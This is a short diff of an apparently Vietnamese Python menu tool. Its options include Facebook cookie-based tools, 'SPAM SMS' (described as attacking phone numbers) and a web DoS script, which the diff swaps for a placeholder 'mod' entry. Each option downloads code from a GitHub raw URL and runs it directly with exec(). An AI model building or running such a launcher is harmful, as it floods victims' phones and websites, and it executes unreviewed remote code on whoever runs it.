@@ -39,7 +39,7 @@ def show_menu():
     table.add_row("1", "TDS FACEBOOK","COOKIE", "HOẠT ĐỘNG")
     table.add_row("2", "TTC FACEBOOK", "COOKIE", "HOẠT ĐỘNG")
     table.add_row("3", "SPAM SMS", "Tấn công số điện thoại", "HOẠT ĐỘNG")
-    table.add_row("4", "SCRIPT DOS", "Tấn công web", "HOẠT ĐỘNG")
+    table.add_row("4", "HMM", "HMM", "DỪNG HOẠT ĐỘNG")
     console.print(table)
 
 # ==================== Kiểm tra mạng ====================
@@ -77,7 +77,7 @@ def main():
             code = requests.get('https://raw.githubusercontent.com/oibog/keytool/refs/heads/main/sms.py').text
             exec(code, globals())
         elif choice == "4":
-            code = requests.get('https://raw.githubusercontent.com/oibog/keytool/refs/heads/main/killv2.js').text
+            code = requests.get('https://raw.githubusercontent.com/oibog/keytool/refs/heads/main/mod').text
             exec(code, globals())
         else:
             console.print("[bold red]Lựa chọn không hợp lệ![/]")
